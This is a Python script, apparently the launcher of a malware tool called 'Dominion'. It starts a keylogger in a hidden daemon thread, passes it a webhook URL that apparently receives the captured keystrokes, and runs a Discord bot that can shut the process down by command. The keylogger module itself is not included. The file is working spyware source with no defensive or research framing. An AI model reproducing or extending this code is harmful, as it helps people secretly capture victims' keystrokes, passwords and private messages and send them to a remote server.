import discord
import os
import asyncio
import threading
import config
from keylogger import Keylogger

intents = discord.Intents.default()
intents.message_content = True  # Enable the message content intent

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

@client.event

async def on_message(message):

    if message.author == client.user:

        return



    if str(message.channel.id) == config.CHANNEL_ID and message.content == f'{config.COMMAND_PREFIX}exit':

        await message.channel.send("Shutting down Dominion...")

        print("Exit command received. Shutting down.")

        os._exit(0) # Force exit the process



def start_keylogger():

    kl = Keylogger(config.WEBHOOK_URL)

    kl.start()



async def main():

    # Start keylogger in a separate thread

    keylogger_thread = threading.Thread(target=start_keylogger)

    keylogger_thread.daemon = True

    keylogger_thread.start()



    # Start Discord bot

    await client.start(config.BOT_TOKEN)



if __name__ == "__main__":

    asyncio.run(main())
